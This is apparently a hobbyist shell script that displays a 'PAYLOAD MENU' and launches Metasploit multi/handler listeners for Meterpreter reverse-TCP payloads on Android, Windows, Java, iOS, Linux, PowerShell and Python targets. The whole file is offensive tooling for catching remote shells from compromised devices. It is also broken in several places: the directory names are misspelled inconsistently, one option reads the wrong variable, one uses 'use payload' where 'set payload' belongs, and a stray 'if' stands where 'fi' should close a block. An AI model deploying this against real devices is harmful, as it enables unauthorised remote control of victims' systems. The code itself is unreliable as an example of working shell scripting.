#!/bin/sh
#
#
#

# STARTING

clear
echo "Loading." 
    sleep 1.0
    clear
echo "Loading.." 
    sleep 1.0
    clear
echo "Loading..." 
    sleep 1.0
    clear
echo "Loading...." 
    sleep 1.0
clear
    sleep 0.5
clear
sleep 1.0
figlet -f big "PAYLOAD MENU" 
sleep 1.0
echo 
echo "1.) MSF Android payload creator" 
    sleep 0.5
echo "2.) MSF Windows payload creator" 
    sleep 0.5
echo "3.) MSF Java payload creator" 
    sleep 0.5
echo "4.) MSF Apple/IOS reverse TCP Handler (armle)" 
    sleep 0.5
echo "5.) MSF Apple/IOS reverse TCP-Handler (aarch64)" 
    sleep 0.5
echo "6.) MSF HTTP / Linux x86 reverse TCP-Handler" 
    sleep 0.5
echo "7.) MSF HTTP / Linux x64 reverse TCP-Handler" 
    sleep 0.5
echo "8.) MSF Windows Powershell injection" 
    sleep 0.5
echo "9.) MSF Python reverse TCP-Handler - Python Meterpreter" 
    sleep 0.5
echo "10.) EXIT"
    sleep 0.5
echo "Select your Payload to create and run:" 
        read attack;
if [ $attack = 1 ]; then
    cd selhosted-MSF-Payloads
    echo "Enter LocalHOST:(eth0):"
        read lhost;
    msfconsole -q -x "use multi/handler; 
    set payload android/meterpreter/reverse_tcp; 
    set LHOST $lhost; 
    set LPORT 4444;
    run"
    cd ..
    echo "Payload completed!"
    echo "Press 'ENTER' to continue..."
        read
fi
if [ $attack = 2 ]; then
    cd selfhosted-MSF-Payloads
    echo "Enter Localhost: (eth0)"
        read lhost;
    echo "Enter target port: (4444)"
        read lport;
    msfconsole -q -x "use multi/handler;
    set payload windows/meterpreter/reverse_tcp;
    set LHOST $lhost;
    set LPORT $lport;
    run"
    cd ..
    echo "Payload completed"
    echo "Press 'ENTER' to continue..."
        read
fi
if [ $attack = 3 ]; then
    cd selfhosted-MSF-payloads
    echo "Enter Localhost:" 
        read lhost;
    echo "Enter target port: (HTTP/80)" 
        read lport;
    msfconsole -q -x "use multi/handler;
    set payload java/meterpreter/reverse_tcp;
    set LHOST $lhost;
    set LPORT $lport;
    run"
    cd ..
    echo "Payload completed"
    echo "Press 'ENTER' to continue..."
        read
fi
if [ $attack = 4 ]; then
    cd selhosted-MSF-Payloads
    echo "Enter Localhost:" 
        read lhost;
    echo "Enter target Port:"
        read lport;
    msfconsole -q -x "use multi/handler;
    set payload apple_ios/armle/meterpreter_reverse_tcp;
    set LHOST $lhost;
    set LPORT $lport;
    run"
    cd ..
    echo "Payload completed" 
    echo "Press 'ENTER' to continue..."
        read
fi
if [ $attack = 5 ]; then
    cd selfhosted-MSF-Payloads
    echo "Enter target Localhost:" 
        read lhost;
    echo "Enter target Port:" 
        read lport;
    msfconsole -q -x "use multi/handler;
    set payload apple_ios/aarch64/meterpreter_reverse_tcp;
    set lhost $lhost;
    set lport $lport;
    run"
    cd ..
    echo "Payload completed" 
    echo "Press 'ENTER' to continue..."
        read
fi
if [ $attack = 6 ]; then
    cd selfhosted-MSF-Payloads
    echo "Enter target Localhost:" 
        read lhost;
    echo "Enter target port:" 
        read lport;
    msfconsole -q -x "use multi/handler;
    set payload cmd/linux/http/x86/meterpreter_reverse_tcp;
    set lhost $lhost;
    set lport $lport;
    run"
    cd ..
    echo "Payload completed" 
    echo "Press 'ENTER' to continue..."
        read
fi
if [ $attack = 7 ]; then
    cd selfhosted-MSF-Payloads
    echo "Enter target Localhost:" 
        read lhost;
    echo "Enter target port:" 
        read port;
    msfconsole -q -x "use multi/handler;
    set payload cmd/linux/http/x64/meterpreter_reverse_tcp;
    set lhost $lhost;
    set lport $lport;
    run" 
    cd ..
    echo "Payload completed"
    echo "Press 'ENTER' to continue..."
        read
if
if [ $attack = 8 ]; then 
    cd slehosted-MSF-Payloads
    echo "Enter target Localhost:" 
        read lhost;
    echo "Enter target port:"
        read lport;
    msfconsole -q -x "use multi/handler;
    set payload cmd/windows/powershell/powershell_reverse_tcp;
    set LHOST $lhost;
    set LPORT $lport;
    run"
    cd ..
    echo "Payload completed"
    echo "Press 'ENTER' to continue..."
        read
fi
if [ $attack = 9 ]; then 
    cd selfhosted-MSF-Payloads
    echo "Enter target Localhost:"
        read lhost;
    echo "Enter target port:" 
        read lport;
    msfconsole -q -x "use multi/handler;
    use payload python/meterpreter/reverse_tcp;
    set LHOST $lhost;
    set LPORT $lport;
    run"
    cd ..
    echo "Payload completed" 
    echo "Press 'ENTER' to continue..."
        read
fi
if [ $attack = 10 ]; then
    cd ..
    ./BashScripting.sh
fi
clear
./menu3.sh
/bin/sh